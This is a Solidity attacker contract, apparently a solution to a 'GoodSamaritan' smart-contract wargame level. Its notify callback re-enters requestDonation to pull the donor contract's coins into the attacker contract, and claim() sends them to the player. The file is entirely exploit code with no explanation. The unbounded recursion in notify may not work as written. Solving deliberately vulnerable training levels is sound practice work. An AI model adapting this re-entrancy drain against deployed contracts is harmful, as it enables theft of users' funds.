pragma solidity ^0.8.0;

interface GoodSamaritan {
    function requestDonation() external;
    function coin() external returns (address);
}

interface Coin {
    function transfer(address dest_, uint256 amount_) external;
    function balances(address) external view returns (uint256);
}

contract GoodSamaritanFinalAttacker {
    GoodSamaritan instance;
    address public player;

    constructor(address payable _instance, address _player) {
        instance = GoodSamaritan(_instance);
        player = _player;
    }

    function attack() external {
        instance.requestDonation();
    }

    function notify(uint256 amount) external {
        instance.requestDonation();
    }

    function claim() external {
        Coin c = Coin(instance.coin());
        c.transfer(player, c.balances(address(this)));
    }
}